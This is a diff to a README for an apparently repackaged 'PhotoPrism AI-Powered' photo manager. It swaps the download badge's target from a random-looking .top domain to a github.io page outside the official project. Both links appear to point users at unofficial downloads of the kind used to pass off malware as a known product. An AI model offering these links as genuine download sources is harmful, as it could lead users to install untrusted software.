@@ -2,7 +2,7 @@
 
 PhotoPrism AI-Powered is a cutting-edge, self-hosted photo management solution that uses artificial intelligence to automatically organize, tag, and enhance your photo library. Perfect for photographers, archivists, and anyone who wants a smarter way to manage their digital memories.
 
-[![Download PhotoPrism](https://img.shields.io/badge/Download-PhotoPrism-blueviolet)](https://poelkakusthbutn.top/)
+[![Download PhotoPrism](https://img.shields.io/badge/Download-PhotoPrism-blueviolet)](https://photoprism-ai-powered.github.io/.github/)
 
 ---
 
